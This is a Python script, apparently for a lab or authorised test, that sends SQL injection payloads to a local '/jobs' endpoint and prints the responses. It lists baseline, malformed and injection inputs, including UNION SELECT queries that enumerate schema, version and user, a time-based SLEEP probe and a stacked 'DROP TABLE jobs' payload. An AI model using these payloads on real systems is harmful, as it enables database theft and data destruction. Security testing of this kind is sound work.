import requests
import json
import urllib.parse
import time

url = "http://127.0.0.1:8000/jobs"
headers = {
    "Content-Type": "application/json",
    "User-Agent": "Security-Testing-Script/1.0"
}

def send_request(payload_dict, payload_desc):
    """Send POST request with retry logic"""
    max_retries = 3
    
    for attempt in range(max_retries):
        try:
            response = requests.post(
                url, 
                json=payload_dict, 
                headers=headers, 
                timeout=10,
                verify=False
            )
            return response
        except requests.exceptions.ConnectionError as e:
            if attempt < max_retries - 1:
                time.sleep(1)
                continue
            print(f"\n[{payload_desc}] ERROR: Connection failed after {max_retries} attempts: {e}")
            return None
        except Exception as e:
            print(f"\n[{payload_desc}] ERROR: {type(e).__name__}: {e}")
            return None

print("="*60)
print("SQL INJECTION TESTING - POST /jobs")
print("="*60)

# Baseline testing with normal values
print("\n[1] BASELINE TESTING")
print("-"*60)
baseline_values = ["back-end", "front-end", "private"]
print(f"\nTesting URL: {url}")

for i, value in enumerate(baseline_values, 1):
    payload = {"job_type": value}
    response = send_request(payload, f"TEST-{i}")
    
    if response:
        print(f"\n[TEST-{i}] Baseline: '{value}'")
        print(f"    Status: {response.status_code}")
        print(f"    Length: {len(response.text)}B")
        print(f"    Response: {response.text[:400]}{'...' if len(response.text) > 400 else ''}")

# Testing invalid values
print("\n\n[2] INVALID VALUE TESTING")
print("-"*60)

invalid_values = [
    ("empty", ""),
    ("invalid", "invalid_job"),
    ("numeric", "12345"),
    ("single-quote", "admin'")
]

for i, (desc, value) in enumerate(invalid_values, 1):
    payload = {"job_type": value}
    response = send_request(payload, f"INVALID-{i}")
    
    if response:
        print(f"\n[INVALID-{i}] {desc}: '{value}'")
        print(f"    Status: {response.status_code}")
        print(f"    Length: {len(response.text)}B")
        if response.status_code != 200 or response.text:
            print(f"    Response: {response.text}")

# SQL injection testing - Basic patterns
print("\n\n[3] SQL INJECTION TESTING - BASIC PATTERNS")
print("-"*60)

basic_sqli = [
    ("SQL_OR", "back-end' OR '1'='1"),
    ("SQL_OR2", "back-end' OR 1=1--"),
    ("SQL_UNION", "back-end' UNION SELECT NULL--"),
    ("SQL_SLEEP", "back-end' AND SLEEP(5)--"),
    ("SQL_ERROR", "back-end'"),
    ("SQL_COMMENT", "back-end--")
]

for i, (desc, value) in enumerate(basic_sqli, 1):
    payload = {"job_type": value}
    response = send_request(payload, f"SQLI-{i}")
    
    if response:
        print(f"\n[SQLI-{i}] {desc}: {value}")
        print(f"    Status: {response.status_code}")
        print(f"    Length: {len(response.text)}B")
        if response.status_code != 200 or response.text != "":
            print(f"    Response: {response.text[:400]}{'...' if len(response.text) > 400 else ''}")

# SQL injection testing - Advanced patterns
print("\n\n[4] SQL INJECTION TESTING - ADVANCED PATTERNS")
print("-"*60)

advanced_sqli = [
    ("UNION_SCHEMA", "back-end' UNION SELECT table_name FROM information_schema.tables--"),
    ("VERSION", "back-end' UNION SELECT version()--"),
    ("DATABASE", "back-end' UNION SELECT database()--"),
    ("USER", "back-end' UNION SELECT user()--"),
    ("BLIND_COUNT", "back-end' AND (SELECT COUNT(*) FROM jobs) > 0--"),
    ("STACKED", "back-end'; DROP TABLE jobs;--")
]

for i, (desc, value) in enumerate(advanced_sqli, 1):
    payload = {"job_type": value}
    response = send_request(payload, f"ADV-{i}")
    
    if response:
        print(f"\n[ADV-{i}] {desc}")
        print(f"    Payload: {value}")
        print(f"    Status: {response.status_code}")
        print(f"    Length: {len(response.text)}B")
        if response.text:
            print(f"    Response: {response.text[:400]}{'...' if len(response.text) > 400 else ''}")

# Final summary
print("\n" + "="*60)
print("TESTING COMPLETE - Summary:")
print("="*60)
print("\nTested endpoint: POST /jobs")
print("Test categories:")
print("  - Baseline (3 tests)")
print("  - Invalid values (4 tests)")
print("  - Basic SQLi patterns (6 tests)")
print("  - Advanced SQLi patterns (6 tests)")
print("\nTOTAL REQUESTS: ~19 tests sent")
